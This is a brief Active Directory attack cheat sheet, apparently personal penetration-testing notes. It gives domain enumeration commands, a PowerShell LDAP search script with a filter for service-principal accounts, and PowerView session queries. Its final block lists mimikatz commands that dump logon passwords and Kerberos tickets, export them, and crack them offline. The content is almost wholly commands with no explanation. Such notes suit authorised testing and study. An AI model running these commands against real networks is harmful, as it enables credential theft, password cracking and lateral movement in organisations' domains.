# Active Directory

### Enumeration

```text
net user /domain
net user <user> /domain
net group /domain

PS> Get-ADUser
PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

```text
$dObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($dObj.PdcRoleOwner).Name
$query= "LDAP://"
$query+= $PDC + "/"
$dName = "DC=$($dObj.Name.Replace('.',',DC='))"
$query+= $dName
$query
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$query)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter = "samAccountType=805306368"
# $Searcher.filter = "name=Peter"
# $Searcher.filter = "objectClass=Group"
# $Searcher.filter = "name=Domain Admins..."
# $Searcher.filter = "serviceprincipalname=*http*"
$Results = $Searcher.FindAll()

Foreach($Result in $Results)
{
    Foreach($Property in $Result.Properties)
    {
        $Property
    }
    Write-Host "---------------------------------------"
}
```

```text
Import-Module .\PowerView.ps1
Get-NetLoggedOn -ComputerName <computer_name>
Get-NetSession -ComputerName <computer_name>
```

```text
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list /export
sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <exported_file_to_crack>
```

cont. 654

